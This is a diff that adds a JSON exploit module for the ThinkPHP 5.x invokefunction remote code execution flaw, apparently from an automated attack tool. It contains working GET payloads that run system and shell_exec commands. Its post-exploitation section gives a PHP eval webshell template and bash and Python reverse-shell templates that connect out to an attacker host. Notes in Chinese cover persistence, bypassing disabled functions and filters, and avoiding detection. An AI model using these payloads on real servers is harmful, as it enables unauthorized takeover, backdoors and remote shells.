@@ -1,0 +1,137 @@
+{
+  "id": "thinkphp-5x-invokefunction-rce",
+  "family": "thinkphp",
+  "product": "ThinkPHP",
+  "cve": "N/A",
+  "aliases": [
+    "ThinkPHP 5 invokeFunction RCE",
+    "ThinkPHP call_user_func_array chain"
+  ],
+  "severity": "critical",
+  "tags": [
+    "thinkphp",
+    "rce",
+    "n-day",
+    "framework",
+    "php"
+  ],
+  "applicability": {
+    "versions": [
+      "5.0.x",
+      "5.1.x"
+    ],
+    "fingerprints": [
+      "index.php?s= route style is enabled",
+      "ThinkPHP stack traces, route errors, or default assets expose the framework",
+      "Public front controller is reachable without rewriting the path"
+    ],
+    "signals": [
+      "The target responds to /index.php?s=index/...",
+      "Error output leaks \\think\\app or \\think\\Container class names",
+      "Headers or HTML comments suggest ThinkPHP 5.x"
+    ]
+  },
+  "preconditions": [
+    "The front controller must be reachable.",
+    "The target should accept route-style dispatch via the s parameter.",
+    "WAF or middleware should not fully block the crafted query string."
+  ],
+  "verification": {
+    "method": "http_get",
+    "requests": [
+      {
+        "path": "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=thinkphp_probe",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0",
+          "Accept": "*/*"
+        },
+        "data": "",
+        "matchers": [
+          "dac1b086a85cb232ad25b1068c06b48e",
+          "HTTP 200 or 500 with md5 marker in body"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0",
+          "Accept": "*/*"
+        },
+        "data": "",
+        "os_hint": "linux"
+      },
+      {
+        "path": "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=whoami",
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "",
+        "os_hint": "unknown"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "先确认执行上下文：id、whoami、pwd、hostname、uname -a。",
+      "优先用 harmless 环境探针判断是否在容器、chroot 或受限 PHP 环境中。",
+      "如果只是命令回显链，优先寻找可写目录、日志文件、会话目录或上传点做持久化，而不是反复直接 system 执行。"
+    ],
+    "shell_options": [
+      {
+        "type": "php_webshell_write",
+        "template": "echo '<?php @eval($_POST[\"cmd\"]); ?>' > {writable_path}/.tp.php"
+      },
+      {
+        "type": "bash_reverse_shell",
+        "template": "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+      },
+      {
+        "type": "python_reverse_shell",
+        "template": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "用 md5/printf 这类无害函数验证链路是否通。",
+      "确认回显后再执行 id/whoami/hostname 等低风险命令。",
+      "评估文件写入、任务计划、日志写 shell、上传点复用等更稳定路径。",
+      "最后才考虑出网型反弹 shell。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "hostname",
+      "uname -a",
+      "php -v"
+    ],
+    "shell_prerequisites": [
+      "确认目标可以出网，或存在可回连的监听端口。",
+      "确认命令执行不是一次性回显且不会被 WAF 重放拦截。",
+      "优先确认 /tmp、web 根目录或上传目录是否可写。"
+    ],
+    "fallbacks": [
+      "如果 system 被禁用，换用 shell_exec、passthru、exec 或文件写入链。",
+      "如果回显不稳定，退回到无害验证并用响应长度/延迟差异做旁证。",
+      "如果命令被过滤，尝试短命令、环境变量探针、编码或分段写文件。"
+    ]
+  },
+  "detection_notes": [
+    "该链路常在访问日志中留下明显的 think\\app/invokefunction 与 function=call_user_func_array 特征。",
+    "对生产环境重复触发高噪声 payload 会增加封禁风险，建议先用 md5 验证。",
+    "有些目标返回 500 但正文仍带执行结果，不要只依赖状态码。"
+  ],
+  "references": [
+    "Vulhub thinkphp/5-rce reproduction",
+    "Public ThinkPHP 5.x invokeFunction exploitation write-ups"
+  ]
+}
